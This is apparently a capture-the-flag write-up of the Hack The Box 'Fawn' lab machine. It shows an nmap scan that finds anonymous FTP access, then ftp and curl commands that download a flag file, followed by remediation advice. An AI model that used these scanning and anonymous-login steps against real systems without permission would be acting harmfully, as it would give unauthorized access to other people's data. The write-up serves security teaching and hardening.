---
layout: post
title: "HTB Starting Point — Fawn: Anonymous FTP"
date: 2026-06-16 13:00:00 -0700
categories: [htb, starting-point]
tags: [ftp, anonymous-login, enumeration, misconfiguration]
---

Second box of the Hack The Box **Starting Point** track. Fawn is the FTP counterpart to
[Meow]({% post_url 2026-06-09-htb-starting-point-meow %}) — a different legacy service,
but the same lesson: a network service exposed **without authentication** hands over data
to anyone who asks.

> **Difficulty:** Very Easy · **OS:** Unix · **Key idea:** anonymous FTP access.

## 1. Recon

Confirm the host is up, then scan:

```bash
nmap -sC -sV -T4 -oN nmap_initial.txt 10.129.x.x
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst:
|_  STAT: ... Control connection is plain text / Data connections will be plain text
```

nmap's scripts did a lot of the work here. Two things jump out:

- **`ftp-anon: Anonymous FTP login allowed (FTP code 230)`** — the server accepts the
  `anonymous` account with no real credentials.
- It even listed a file: **`flag.txt`**, sitting in the FTP root.

## 2. Analysis

**FTP** is another pre-encryption legacy protocol (control and data channels are both
plaintext — nmap flags this explicitly). On its own that's a weakness. Combined with
**anonymous login enabled**, it means any unauthenticated user on the network can browse
and download whatever the FTP root exposes. Here, that includes `flag.txt`.

## 3. Loot

Log in anonymously and pull the file. The interactive way:

```bash
ftp 10.129.x.x
# Name: anonymous
# Password: (blank — just press Enter)
ftp> ls
ftp> get flag.txt
ftp> bye
```

Or in a single non-interactive line with `curl`:

```bash
curl "ftp://anonymous:anonymous@10.129.x.x/flag.txt" -o flag.txt
cat flag.txt   # -> [REDACTED — 32-char hash]
```

Flag retrieved, machine owned. ✅ No exploit, no shell needed — just an exposed file
share.

## 4. Why it worked & how to fix it

| Root cause | Remediation |
|---|---|
| Anonymous FTP login enabled | Disable anonymous access (`anonymous_enable=NO` in vsftpd) |
| Sensitive files in FTP root | Don't serve sensitive data over FTP; scope shared dirs tightly |
| Plaintext protocol | Replace FTP with **SFTP/FTPS**; require authentication |

**Takeaway:** the `nmap` NSE scripts (`-sC`) are worth reading closely — `ftp-anon`
confirmed the misconfiguration *and* enumerated the loot before I ever touched the
service. Enumeration keeps paying off.

*Performed in a legal, authorized environment (HTB Starting Point).*
